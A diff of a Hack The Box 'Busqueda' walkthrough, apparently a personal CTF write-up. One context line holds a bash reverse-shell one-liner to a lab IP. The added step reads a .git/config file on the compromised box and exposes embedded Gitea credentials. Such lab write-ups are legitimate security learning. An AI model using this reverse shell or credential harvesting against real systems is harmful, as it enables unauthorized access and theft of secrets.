@@ -110,5 +110,28 @@ bash -i >& /dev/tcp/10.10.14.25/1337 0>&1
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ca6c8071-116a-4c3e-88e0-6cf31dc86e88)
 
 
-11. 
+11. Well, when traversing to find the user.txt before, I found a .git directory which has a cred at the config file. Also it referencing to gitea.searcher.htb site.
+
+```
+svc@busqueda:/var/www/app/.git$ cat config
+cat config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+        remote = origin
+        merge = refs/heads/main
+svc@busqueda:/var/www/app/.git$ 
+```
+
+> gitea.searcher.htb
+
+![Uploading image.png…]()
+
+
 
